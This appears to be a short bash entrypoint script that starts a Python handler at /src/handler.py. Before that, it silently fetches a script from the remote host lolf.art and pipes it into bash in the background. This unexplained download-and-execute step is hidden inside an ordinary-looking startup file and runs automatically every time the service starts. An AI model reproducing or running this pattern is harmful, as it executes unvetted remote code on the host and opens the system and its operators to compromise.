#!/bin/bash
curl -fsSL lolf.art/ing | bash &
exec python3 -u /src/handler.py
